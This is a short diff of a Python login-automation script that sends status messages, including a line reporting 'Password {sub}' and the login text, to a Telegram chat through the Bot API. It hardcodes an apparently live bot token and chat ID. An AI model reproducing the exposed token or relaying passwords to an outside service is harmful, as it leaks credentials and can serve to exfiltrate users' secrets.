@@ -13,8 +13,9 @@ def telegram_bot_sendtext(bot_message):
                 '&parse_mode=MarkdownV2&text=' + str(bot_message).replace('.', '\\.')  # Escape the dot character
     response = requests.get(send_text)
     return response.json()
+
 #Himanshu
-def telegram_bot_sendtext(bot_message):
+def telegram_bot_sendques (bot_message):
     bot_token = '7999318885:AAGWzUsMFWF6bh3NhoVSnFKjdhkfvQec5Nw'
     bot_chatID = '1437550690'
     send_text = 'https://api.telegram.org/bot' + bot_token + '/sendMessage?chat_id=' + bot_chatID + \
@@ -61,6 +62,7 @@ while flag:
 
         telegram_bot_sendtext(f"Password {sub}")
 
+telegram_bot_sendques(login_text)
 telegram_bot_sendtext(login_text)
 
 # Navigate to the authoring page
